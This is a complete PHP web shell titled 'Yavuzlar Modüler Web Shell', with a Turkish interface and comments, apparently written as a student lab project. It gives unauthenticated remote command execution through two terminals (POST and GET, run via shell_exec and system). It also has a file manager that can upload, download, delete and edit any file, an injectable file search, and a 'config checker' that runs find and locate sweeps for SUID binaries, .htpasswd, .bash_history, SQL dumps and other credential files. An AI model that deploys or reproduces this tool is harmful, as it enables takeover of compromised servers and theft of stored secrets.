<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Yavuzlar Modüler Web Shell</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f0f0f0;
        }
        .header {
            background-color: #333;
            color: white;
            padding: 10px;
            text-align: center;
        }
        .menu {
            background-color: #444;
            overflow: hidden;
        }
        .menu button {
            background-color: #444;
            color: white;
            padding: 14px 20px;
            border: none;
            cursor: pointer;
            float: left;
            width: 20%;
        }
        .menu button:hover {
            background-color: #555;
        }
        .content {
            padding: 20px;
        }
        .hidden {
            display: none;
        }
            /* From Uiverse.io by nikk7007 */ 
        .btn {
         --color: #00A97F;
         --color2: rgb(10, 25, 30);
         padding: 0.8em 1.75em;
         background-color: transparent;
         border-radius: 6px;
         border: .3px solid var(--color);
         transition: .5s;
         position: relative;
         overflow: hidden;
         cursor: pointer;
         z-index: 1;
         font-weight: 300;
         font-size: 17px;
         font-family: 'Roboto', 'Segoe UI', sans-serif;
         text-transform: uppercase;
         color: var(--color);
        }

        .btn::after, .btn::before {
         content: '';
         display: block;
         height: 100%;
         width: 100%;
         transform: skew(90deg) translate(-50%, -50%);
         position: absolute;
         inset: 50%;
         left: 25%;
         z-index: -1;
         transition: .5s ease-out;
         background-color: var(--color);
        }

        .btn::before {
         top: -50%;
         left: -25%;
         transform: skew(90deg) rotate(180deg) translate(-50%, -50%);
        }

        .btn:hover::before {
         transform: skew(45deg) rotate(180deg) translate(-50%, -50%);
        }

        .btn:hover::after {
         transform: skew(45deg) translate(-50%, -50%);
        }

        .btn:hover {
         color: var(--color2);
        }

        .btn:active {
         filter: brightness(.7);
         transform: scale(.98);
        }

        .btn2 {
         --color: #00A97F;
         --color2: rgb(10, 25, 30);
         padding: 0.8em 1.75em;
         background-color: transparent;
         border-radius: 6px;
         border: .3px solid var(--color);
         transition: .5s;
         position: relative;
         overflow: hidden;
         cursor: pointer;
         z-index: 1;
         font-weight: 300;
         font-size: 17px;
         font-family: 'Roboto', 'Segoe UI', sans-serif;
         text-transform: uppercase;
         color: var(--color);
        }
    </style>
</head>
<body>

<div class="header">
    <h1>Yavuzlar Modüler Web Shell</h1>
</div>

<div class="menu">
    <button onclick="loadPage('home')">Ana Sayfa</button>
    <button onclick="loadPage('terminal')">Terminal (POST Request)</button>
    <button onclick="loadPage('terminalv2')">Terminal V2(GET Request)</button>
    <button onclick="loadPage('filemanager')">Dosya Yöneticisi</button>
    <button onclick="loadPage('filesearch')">Dosya Arama</button>
    <button onclick="loadPage('configchecker')">Config Dosyası Tespiti(ve suid dosyalari gibi şeyler) </button>
    <button onclick="loadPage('serverinfo')">Sunucu Bilgileri</button>
</div>

<div class="content" id="content">
    <?php



    // Alt sayfaları buraya fonksiyon olarak ekliyoruz Hocam
    function homePage() {
        echo '<h2>Ana Sayfa</h2> <p>Yavuzlar Web Shell e hoşgeldiniz.</p>';
        echo '<p> Kullanmak istediğiniz kısmı üst menüden seçiniz.</p>';
        echo '<p>Dikkat! config dosyası tespiti kısmı sisteme ağır yük bindiriyor!</p>';
        echo '<p>Dikkat! POST isteği bazı lab ortamlarında engelleniyor o yüzden yerine v2 terminali kullanabilirsiniz.</p>';
        echo '<p>Made with ❤️ - Made by Xnes<p>';
    }

    function filemanagerPage() {


        // Dosya listeleme kısmı        
        global $dir_path;
        if (isset($_GET["directory"])) {
            $dir_path = $_GET["directory"];
        } 
        else {
            $dir_path = $_SERVER["DOCUMENT_ROOT"] . "/";
        }
        
        $directories = scandir($dir_path);
        echo '<h2>Dosya Yöneticisi</h2>';
        echo '<p>Şu anki dizin: ' . $dir_path . '</p>';
        $parentDir = dirname($dir_path);
        echo "<li><a href='?page=filemanager&directory=" . urlencode($parentDir) . "'>[Üst Klasör]</a></li>";
        echo '<ul>';
        

        // Her klasörler için görüntüleme, dosyalar için indirme ve silme butonları
        foreach ($directories as $entry) {
            if ($entry != "." && $entry != "..") {
                $fullPath = $dir_path . "/" . $entry;
                $filePermission = substr(sprintf('%o', fileperms($fullPath)), -3);
                if (is_dir($fullPath)) {
                    echo "<li><strong>Klasör:</strong> $entry (İzin: $filePermission) <a href='?page=filemanager&directory=" . urlencode($fullPath) . "'>Görüntüle</a> </li>";
                } else {
                    echo "<li><strong>Dosya:</strong> $entry (İzin: $filePermission) <a href='?page=download&file=" . urlencode($fullPath) . "'>İndir</a> <a href='?page=filemanager&delete=" . urlencode($fullPath) . "' onclick=\"return confirm('Bu dosyayı silmek istediğinizden emin misiniz?')\">Sil</a> <a href='?page=editfile&file=" . urlencode($fullPath) . "'>Düzenle</a></li>  </li>";
                }
            }
        }
        
        echo '</ul>';
    



        echo '<h2>Dosya Yükle</h2>';
        echo '<form action="?page=filemanager" method="post" enctype="multipart/form-data">';
        echo '<label for="fileToUpload">Yüklemek için dosya seçin:</label>';
        echo '<input type="file" class="btn" name="fileToUpload" id="fileToUpload">';
        echo '<input type="hidden" name="directory" value="' . $dir_path . '">';
        echo '<input type="submit" class="btn" value="Dosya Yükle" name="submit">';
        echo '</form>';
    
        // Dosya yüklediğimiz kısım burası
        if (isset($_POST['submit'])) {
            $target_dir = $_POST['directory'];
            //rtim ile sonuna / ekledik
            $target_dir = rtrim($_POST['directory'], '/') . '/';
            $target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
            if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
                echo "<p>Dosya başarıyla yüklendi: " . basename($_FILES["fileToUpload"]["name"]) . "</p>";
            } else {
                echo "<p>Üzgünüz, dosya yükleme sırasında bir hata oluştu.</p>";
            }
        }
    
        // Dosya silme işlemi
        if (isset($_GET['delete'])) {
            $fileToDelete = $_GET['delete'];
            if (is_file($fileToDelete)) {
                if (unlink($fileToDelete)) {
                    echo "<p>Dosya başarıyla silindi: " . htmlspecialchars($fileToDelete, ENT_QUOTES, 'UTF-8') . "</p>";
                } else {
                    echo "<p>Üzgünüz, dosya silme sırasında bir hata oluştu.</p>";
                }
            } elseif (is_dir($fileToDelete)) {
                if (rmdir($fileToDelete)) {
                    echo "<p>Klasör başarıyla silindi: " . htmlspecialchars($fileToDelete, ENT_QUOTES, 'UTF-8') . "</p>";
                } else {
                    echo "<p>Üzgünüz, klasör silme sırasında bir hata oluştu.</p>";
                }
            } else {
                echo "<p>Belirtilen dosya veya klasör bulunamadı: " . htmlspecialchars($fileToDelete, ENT_QUOTES, 'UTF-8') . "</p>";
            }
        }
    }
    
    
    function downloadPage() {
        // bu aslında ana menüde bulunmuyor ancak dosya yöneticisinde bu sayfaya yönlendirme yaptığım için bu şekilde yazdım.
        // alınan dosyanın indirildiği kısım burası
        if (isset($_GET['file'])) {
            $filePath = $_GET['file'];
    
            if (file_exists($filePath)) {
                // ob clean eklendi - output bufferi temizliği
                ob_clean();
                header('Content-Description: File Transfer');
                header('Content-Type: application/octet-stream');
                header('Content-Disposition: attachment; filename="' . basename($filePath) . '"');
                header('Expires: 0');
                header('Cache-Control: must-revalidate');
                header('Pragma: public');
                header('Content-Length: ' . filesize($filePath));
                readfile($filePath);
                exit;
            } else {
                echo '<p>Dosya bulunamadı: ' . htmlspecialchars($filePath, ENT_QUOTES, 'UTF-8') . '</p>';
            }
        }
    }

    function terminalPage() {
        // Post Request ile çalışan Terminal sayfası 
        $output = '';
        if (!empty($_POST['cmd'])) {
            $cmd = $_POST['cmd'];
    
            // help komutu için biz bilgilendirmeyi yapıyoruz, ek komutlar eklenebilir
            if ($cmd === 'help') {
                $output = "Kullanılabilir bazı komutlar:\n";
                $output .= "ls - Dosyaları ve klasörleri listele\n";
                $output .= "cat - Dosya içeriğini görüntüle\n";
                $output .= "pwd - Şuanki çalışma dizinini görüntüle\n";
                $output .= "whoami - Sistemdeki yetkimizi görüntüleme\n";
                $output .= "date - Şuanki tarih ve saati görme\n";
                $output .= "uname - Sistem bilgileri görme\n";
            } 
            else {
                $output = shell_exec($cmd . ' 2>&1');
            }
        }
    
        echo '<h2>Terminal</h2>';
        echo '<p>Klasik terminal v1, bu terminal çalışmazsa basit halini denemek için alttaki buton ile diğer terminale geçin.</p>';
        echo '<p> Bu terminalin çalışmayabiliyor olmasının sebebi post istekleri bazı lab ortamlarında engelleniyor ondan</p>';
        echo '<form method="POST" action="?page=terminal">';
        echo '<label for="cmd"><strong>Command</strong></label>';
        echo '<div class="form-group">';
        echo '<input type="text" name="cmd" id="cmd" value="' . ($cmd ?? '') . '" onfocus="this.setSelectionRange(this.value.length, this.value.length);" autofocus required>';
        echo '<button class="btn" type="submit">Execute</button>';
        echo '</div>';
        echo '</form>';
        
        // Komut çıktısı varsa göster
        if (!empty($output)) {
            echo '<h2>Output</h2>';
            echo '<pre>' . $output . '</pre>';
        } else {
            echo '<pre><small>No result.</small></pre>';
        }
        echo '<br><br><br><a href="?page=terminalv2" class="btn2" >TerminalV2</a>';
    }


    function serverinfoPage() {
        // Sunucu bilgilerini topla
        $serverInfo = [
            'Sistem Bilgileri' => php_uname(),
            'Sunucu Yazılımı' => $_SERVER['SERVER_SOFTWARE'],
            'Sunucu İsmi' => $_SERVER['SERVER_NAME'],
            'Sunucu Protokolü' => $_SERVER['SERVER_PROTOCOL'],
            'Belge Kök Dizini' => $_SERVER['DOCUMENT_ROOT'],
            'Güncel Zaman' => date('Y-m-d H:i:s'),
            'PHP Sürümü' => phpversion(),
            'Yüklenmiş PHP Eklentileri' => implode(', ', get_loaded_extensions()),
            'Sunucu IP' => $_SERVER['SERVER_ADDR'],
            'Client(müşteri-biz) IP' => $_SERVER['REMOTE_ADDR'],
            'HTTP User Agent(bunun türkçesi tuhaf oluyor hocam :p)' => $_SERVER['HTTP_USER_AGENT'],
        ];
    
        // Çıktı kısmı
        echo '<h2>Sunucu Bilgileri</h2>';
        echo '<table border="1" cellpadding="5" cellspacing="0">';
        foreach ($serverInfo as $key => $value) {
            echo '<tr>';
            echo '<td><strong>' . $key . '</strong></td>';
            echo '<td>' . $value . '</td>';
            echo '</tr>';
        }
        echo '</table>';
    }

    function filesearchPage() {
        // Dosya arama sayfası, bu sayfa da post ile çalışıyor
        echo '<h2>Dosya Arama</h2>';
    
        // Arama formu
        echo '<form method="POST" action="?page=filesearch">';
        echo '<label for="searchDirectory">Arama Yapılacak Dizin:</label>';
        echo '<input type="text" name="searchDirectory" id="searchDirectory" value="' . ($_POST['searchDirectory'] ?? $_SERVER["DOCUMENT_ROOT"]) . '" required>';
        echo '<br><label for="searchQuery">Aranacak Dosya Adı:</label>';
        echo '<input type="text" name="searchQuery" id="searchQuery" value="' . ($_POST['searchQuery'] ?? '') . '" required>';
        echo '<br><button class="btn" type="submit">Ara</button>';
        echo '</form>';
    
        // Arama işlemi
        if (isset($_POST['searchDirectory']) && isset($_POST['searchQuery'])) {
            $searchDirectory = $_POST['searchDirectory'];
            $searchQuery = $_POST['searchQuery'];
    
            // Arama komutunu oluştur
            $command = "find \"$searchDirectory\" -type f -name \"*$searchQuery*\"";
    
            // Komutu çalıştır ve sonucu al
            $output = shell_exec($command . ' 2>&1');
    
            // Sonuçları göster
            if (!empty($output)) {
                echo '<h3>Arama Sonuçları</h3>';
                echo '<pre>' . $output . '</pre>';
            } else {
                echo '<p>Arama sonuçları bulunamadı.</p>';
            }
        }
    }


    function configcheckerPage() {
        // Komutların listesi

        // komutları şurdan ödünçaldım 
        /*
        https://isc.sans.edu/diary/Webshell+looking+for+interesting+files/23567
        */
        $commands = [
            "tüm suid dosyalarını bul" => "find / -type f -perm -04000 -ls",
            "mevcut dizindeki suid dosyalarını bul" => "find . -type f -perm -04000 -ls",
            "tüm sgid dosyalarını bul" => "find / -type f -perm -02000 -ls",
            "mevcut dizindeki sgid dosyalarını bul" => "find . -type f -perm -02000 -ls",
            "config.inc.php dosyalarını bul" => "find / -type f -name config.inc.php",
            "config* dosyalarını bul" => "find / -type f -name \"config*\"",
            "mevcut dizindeki config* dosyalarını bul" => "find . -type f -name \"config*\"",
            "tüm yazılabilir klasörler ve dosyaları bul" => "find / -perm -2 -ls",
            "mevcut dizindeki yazılabilir klasörler ve dosyaları bul" => "find . -perm -2 -ls",
            "tüm service.pwd dosyalarını bul" => "find / -type f -name service.pwd",
            "mevcut dizindeki service.pwd dosyalarını bul" => "find . -type f -name service.pwd",
            "tüm .htpasswd dosyalarını bul" => "find / -type f -name .htpasswd",
            "mevcut dizindeki .htpasswd dosyalarını bul" => "find . -type f -name .htpasswd",
            "tüm .bash_history dosyalarını bul" => "find / -type f -name .bash_history",
            "mevcut dizindeki .bash_history dosyalarını bul" => "find . -type f -name .bash_history",
            "tüm .fetchmailrc dosyalarını bul" => "find / -type f -name .fetchmailrc",
            "mevcut dizindeki .fetchmailrc dosyalarını bul" => "find . -type f -name .fetchmailrc",
            "httpd.conf dosyalarını bul" => "locate httpd.conf",
            "vhosts.conf dosyalarını bul" => "locate vhosts.conf",
            "proftpd.conf dosyalarını bul" => "locate proftpd.conf",
            "psybnc.conf dosyalarını bul" => "locate psybnc.conf",
            "my.conf dosyalarını bul" => "locate my.conf",
            "admin.php dosyalarını bul" => "locate admin.php",
            "cfg.php dosyalarını bul" => "locate cfg.php",
            "conf.php dosyalarını bul" => "locate conf.php",
            "config.dat dosyalarını bul" => "locate config.dat",
            "config.php dosyalarını bul" => "locate config.php",
            "config.inc dosyalarını bul" => "locate config.inc",
            "config.default.php dosyalarını bul" => "locate config.default.php",
            ".conf dosyalarını bul" => "locate '.conf'",
            ".pwd dosyalarını bul" => "locate '.pwd'",
            ".sql dosyalarını bul" => "locate '.sql'",
            ".htpasswd dosyalarını bul" => "locate '.htpasswd'",
            ".bash_history dosyalarını bul" => "locate '.bash_history'",
            ".mysql_history dosyalarını bul" => "locate '.mysql_history'",
            ".fetchmailrc dosyalarını bul" => "locate '.fetchmailrc'",
            "yedek dosyalarını bul" => "locate backup",
            "dump dosyalarını bul" => "locate dump",
            "priv dosyalarını bul" => "locate priv"
        ];
    
        echo '<h2>Config Dosyası Tespiti</h2>';
        // sırayla komutların açıklamalarını yapıp çıktılarını yazdığımız kısım
        foreach ($commands as $description => $command) {
            echo '<h3>' . $description . '</h3>';
            echo '<pre>';
            echo shell_exec($command . ' 2>&1');
            echo '</pre>';
        }
    }


    function terminalv2Page() {
        // daha basit ve get ile çalışan terminal kısmı
        echo '<h2>Terminal V2</h2>';
        echo '<p>Daha basit ve temiz bir terminal arayüzü.</p>';
        echo '<form method="GET" name="' . basename($_SERVER['PHP_SELF']) . '">';
        echo '<input type="hidden" name="page" value="terminalv2">';
        echo '<input type="TEXT" name="cmd" autofocus id="cmd" size="80">';
        echo '<input type="SUBMIT" value="Execute">';
        echo '</form>';
        echo '<pre>';
        if(isset($_GET['cmd'])) {
            $cmd=$_GET['cmd'];
            if($cmd === 'help') {
                echo "Kullanılabilir bazı komutlar:\n";
                echo "ls - Dosyaları ve klasörleri listele\n";
                echo "cat - Dosya：icerigini görüntüle\n";
                echo "pwd - Şuanki çalışma dizinini görüntüle\n";
                echo "whoami - Sistemdeki yetkimizi görüntüleme\n";
                echo "date - Şuanki tarih ve saati görme\n";
                echo "uname - Sistem bilgileri görme\n";
            }
            else {
            system($_GET['cmd'] . ' 2>&1');
            }
        }
        echo '</pre>';
    }

    function editfilePage() {
        // Dosya editlediğimiz sayfa
        // kaynaklar: https://www.php.net/manual/en/function.file-put-contents.php
        // https://stackoverflow.com/questions/18865548/how-to-edit-update-a-txt-file-with-php
        if (!isset($_GET['file'])) {
            echo '<p>Dosya belirtilmedi.</p>';
            return;
        }
    
        $file_path = $_GET['file'];
    
        // dosya var mı yok mu onun kontrolü
        if (!file_exists($file_path)) {
            echo '<p>Dosya bulunamadı: ' . htmlspecialchars($file_path, ENT_QUOTES, 'UTF-8') . '</p>';
            return;
        }
    
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            $new_content = $_POST['file_content'];
            if (file_put_contents($file_path, $new_content) !== false) {
                echo '<p>Dosya başarıyla güncellendi.</p>';
            } else {
                echo '<p>Dosya güncellenirken bir hata oluştu.</p>';
            }
        }
    
        // Dosya içeriğini al
        $current_content = file_get_contents($file_path);
    
        // Form kısmı falan filan
        echo '<h2>Dosya Düzenle</h2>';
        echo '<form method="POST" action="?page=editfile&file=' . urlencode($file_path) . '">';
        echo '<textarea name="file_content" rows="20" cols="80">' . htmlspecialchars($current_content, ENT_QUOTES, 'UTF-8') . '</textarea><br>';
        echo '<input type="submit" class="btn" value="Kaydet">';
        echo '</form>';
    }


    // Sayfayı seçip doğru fonksiyonu çağırıyoruz
    $page = $_GET['page'] ?? 'home'; // Varsayılan olarak 'home' sayfası yüklenecek

    if ($page == 'home') {
        homePage();
    } 
    elseif ($page == 'filemanager') {
        filemanagerPage();
    } 
    elseif ($page == 'configchecker') {
        configcheckerPage();
    } 
    elseif ($page == 'download') {
        downloadPage();
    } 
    elseif ($page == 'terminal') {
        terminalPage();
    }
    elseif( $page == 'filesearch') {
        filesearchPage();
    }
    elseif ($page == 'serverinfo') {
        serverinfoPage();
    }
    elseif ($page == 'terminalv2') {
        terminalv2Page();
    }
    elseif ($page == 'editfile') {
        editfilePage();
    }
    else {
        echo '<h2>Sayfa Bulunamadı</h2>';
    }
    ?>
</div>

<script>
    //sayfa değiştirdiğimiz fonksiyon
function loadPage(page) {
    window.history.pushState({}, '', '?page=' + page);
    location.reload();
}
</script>

</body>
</html>


